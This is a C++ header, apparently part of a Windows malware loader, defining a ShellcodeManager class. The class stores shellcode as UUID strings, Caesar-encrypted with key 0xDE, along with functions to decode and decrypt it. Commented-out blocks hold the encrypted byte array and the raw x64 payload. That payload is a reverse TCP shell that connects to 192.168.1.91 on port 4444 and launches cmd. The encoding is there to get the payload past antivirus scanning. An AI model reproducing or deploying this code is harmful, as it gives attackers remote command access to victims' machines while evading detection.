#pragma once

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

class ShellcodeManager
{
public:
	ShellcodeManager();
	VOID PrintShellcode();
	std::vector<unsigned char> GetShellcode();
	int key = 0xDE;
private:
	std::vector<unsigned char> shellcode;
	std::vector<std::string> uuid_shellcode_vector = {
		"da2661c2-cec6-9ede-dede-1f2f1f2e302f",
		"34260fb0-4326-6930-3e26-6930f6266930",
		"fe266950-2e26-ed95-2828-2b0fa7260f9e",
		"8a1a3f5a-e00a-fe1f-9fa7-eb1fdf9fc0cb",
		"301f2f26-6930-fe69-201a-26dfae695e66",
		"dedede26-639e-5245-26df-ae2e6926f622",
		"691efe27-dfae-c134-26dd-a71f69126626",
		"dfb42b0f-a726-0f9e-8a1f-9fa7eb1fdf9f",
		"16be53cf-2ae1-2a02-e623-17af53b63622",
		"691e0227-dfae-441f-69ea-2622691efa27",
		"dfae1f69-e266-26df-ae1f-361f363c3738",
		"1f361f37-1f38-2661-cafe-1f30ddbe361f",
		"37382669-f0c7-35dd-dddd-3b279c555110",
		"3d1110de-de1f-3427-67c4-265fca7edfde",
		"de2767c3-279a-e0de-ef3a-9e86df391f32",
		"2767c22a-67cf-1f98-2a55-04e5ddb32a67",
		"c846dfdf-dede-371f-9807-5e49deddb32e",
		"2e2b0fa7-2b0f-9e26-dd9e-2667a026dd9e",
		"26679f1f-98c8-edbd-bedd-b32667a548ee",
		"1f362a67-c026-67d7-1f98-7783523fddb3",
		"265fa21e-e0de-de27-9641-4b42dededede",
		"de1f2e1f-2e26-67c0-3535-352b0f9e48eb",
		"371f2ec0-da44-a522-0232-dfdf266b2202",
		"f6a4de46-2667-c434-2e1f-2e1f2e1f2e27",
		"dd9e1f2e-27dd-a62b-679f-2a679f1f9857",
		"aa1d64dd-b326-0fb0-26dd-a869ec1f98e6",
		"65fb3edd-b399-ce93-8034-1f9884739b7b",
		"ddb32661-a206-1ae4-5ae8-5ed9be53e399",
		"25f1504d-48de-371f-67b8-ddb36e6e6e6e",
	};

	VOID						_UUIDListToShellcode(const std::vector<std::string>& uuidList);
	VOID						_CaesarDecrypt(std::vector<unsigned char>& data, unsigned char key);
	/*
	VOID						_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key);
	*/
	std::vector<unsigned char>	_HexStringToBytes(const std::string& hex);
};

//std::vector<unsigned char> shellcode = {
//	0xda, 0x26, 0x61, 0xc2, 0xce, 0xc6, 0x9e, 0xde, 0xde, 0xde, 0x1f, 0x2f, 0x1f, 0x2e, 0x30, 0x2f,
//	0x34, 0x26, 0x0f, 0xb0, 0x43, 0x26, 0x69, 0x30, 0x3e, 0x26, 0x69, 0x30, 0xf6, 0x26, 0x69, 0x30,
//	0xfe, 0x26, 0x69, 0x50, 0x2e, 0x26, 0xed, 0x95, 0x28, 0x28, 0x2b, 0x0f, 0xa7, 0x26, 0x0f, 0x9e,
//	0x8a, 0x1a, 0x3f, 0x5a, 0xe0, 0x0a, 0xfe, 0x1f, 0x9f, 0xa7, 0xeb, 0x1f, 0xdf, 0x9f, 0xc0, 0xcb,
//	0x30, 0x1f, 0x2f, 0x26, 0x69, 0x30, 0xfe, 0x69, 0x20, 0x1a, 0x26, 0xdf, 0xae, 0x69, 0x5e, 0x66,
//	0xde, 0xde, 0xde, 0x26, 0x63, 0x9e, 0x52, 0x45, 0x26, 0xdf, 0xae, 0x2e, 0x69, 0x26, 0xf6, 0x22,
//	0x69, 0x1e, 0xfe, 0x27, 0xdf, 0xae, 0xc1, 0x34, 0x26, 0xdd, 0xa7, 0x1f, 0x69, 0x12, 0x66, 0x26,
//	0xdf, 0xb4, 0x2b, 0x0f, 0xa7, 0x26, 0x0f, 0x9e, 0x8a, 0x1f, 0x9f, 0xa7, 0xeb, 0x1f, 0xdf, 0x9f,
//	0x16, 0xbe, 0x53, 0xcf, 0x2a, 0xe1, 0x2a, 0x02, 0xe6, 0x23, 0x17, 0xaf, 0x53, 0xb6, 0x36, 0x22,
//	0x69, 0x1e, 0x02, 0x27, 0xdf, 0xae, 0x44, 0x1f, 0x69, 0xea, 0x26, 0x22, 0x69, 0x1e, 0xfa, 0x27,
//	0xdf, 0xae, 0x1f, 0x69, 0xe2, 0x66, 0x26, 0xdf, 0xae, 0x1f, 0x36, 0x1f, 0x36, 0x3c, 0x37, 0x38,
//	0x1f, 0x36, 0x1f, 0x37, 0x1f, 0x38, 0x26, 0x61, 0xca, 0xfe, 0x1f, 0x30, 0xdd, 0xbe, 0x36, 0x1f,
//	0x37, 0x38, 0x26, 0x69, 0xf0, 0xc7, 0x35, 0xdd, 0xdd, 0xdd, 0x3b, 0x27, 0x9c, 0x55, 0x51, 0x10,
//	0x3d, 0x11, 0x10, 0xde, 0xde, 0x1f, 0x34, 0x27, 0x67, 0xc4, 0x26, 0x5f, 0xca, 0x7e, 0xdf, 0xde,
//	0xde, 0x27, 0x67, 0xc3, 0x27, 0x9a, 0xe0, 0xde, 0xef, 0x3a, 0x9e, 0x86, 0xdf, 0x39, 0x1f, 0x32,
//	0x27, 0x67, 0xc2, 0x2a, 0x67, 0xcf, 0x1f, 0x98, 0x2a, 0x55, 0x04, 0xe5, 0xdd, 0xb3, 0x2a, 0x67,
//	0xc8, 0x46, 0xdf, 0xdf, 0xde, 0xde, 0x37, 0x1f, 0x98, 0x07, 0x5e, 0x49, 0xde, 0xdd, 0xb3, 0x2e,
//	0x2e, 0x2b, 0x0f, 0xa7, 0x2b, 0x0f, 0x9e, 0x26, 0xdd, 0x9e, 0x26, 0x67, 0xa0, 0x26, 0xdd, 0x9e,
//	0x26, 0x67, 0x9f, 0x1f, 0x98, 0xc8, 0xed, 0xbd, 0xbe, 0xdd, 0xb3, 0x26, 0x67, 0xa5, 0x48, 0xee,
//	0x1f, 0x36, 0x2a, 0x67, 0xc0, 0x26, 0x67, 0xd7, 0x1f, 0x98, 0x77, 0x83, 0x52, 0x3f, 0xdd, 0xb3,
//	0x26, 0x5f, 0xa2, 0x1e, 0xe0, 0xde, 0xde, 0x27, 0x96, 0x41, 0x4b, 0x42, 0xde, 0xde, 0xde, 0xde,
//	0xde, 0x1f, 0x2e, 0x1f, 0x2e, 0x26, 0x67, 0xc0, 0x35, 0x35, 0x35, 0x2b, 0x0f, 0x9e, 0x48, 0xeb,
//	0x37, 0x1f, 0x2e, 0xc0, 0xda, 0x44, 0xa5, 0x22, 0x02, 0x32, 0xdf, 0xdf, 0x26, 0x6b, 0x22, 0x02,
//	0xf6, 0xa4, 0xde, 0x46, 0x26, 0x67, 0xc4, 0x34, 0x2e, 0x1f, 0x2e, 0x1f, 0x2e, 0x1f, 0x2e, 0x27,
//	0xdd, 0x9e, 0x1f, 0x2e, 0x27, 0xdd, 0xa6, 0x2b, 0x67, 0x9f, 0x2a, 0x67, 0x9f, 0x1f, 0x98, 0x57,
//	0xaa, 0x1d, 0x64, 0xdd, 0xb3, 0x26, 0x0f, 0xb0, 0x26, 0xdd, 0xa8, 0x69, 0xec, 0x1f, 0x98, 0xe6,
//	0x65, 0xfb, 0x3e, 0xdd, 0xb3, 0x99, 0xce, 0x93, 0x80, 0x34, 0x1f, 0x98, 0x84, 0x73, 0x9b, 0x7b,
//	0xdd, 0xb3, 0x26, 0x61, 0xa2, 0x06, 0x1a, 0xe4, 0x5a, 0xe8, 0x5e, 0xd9, 0xbe, 0x53, 0xe3, 0x99,
//	0x25, 0xf1, 0x50, 0x4d, 0x48, 0xde, 0x37, 0x1f, 0x67, 0xb8, 0xdd, 0xb3, 0x6e, 0x6e, 0x6e, 0x6e
//};


/*static constexpr unsigned char shellcode = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
	"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
	"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x5b"
	"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
	"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
	"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
	"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
	"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
	"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
	"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
	"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
	"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
	"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
	"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
	"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
	"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
	"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
	"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
}*/
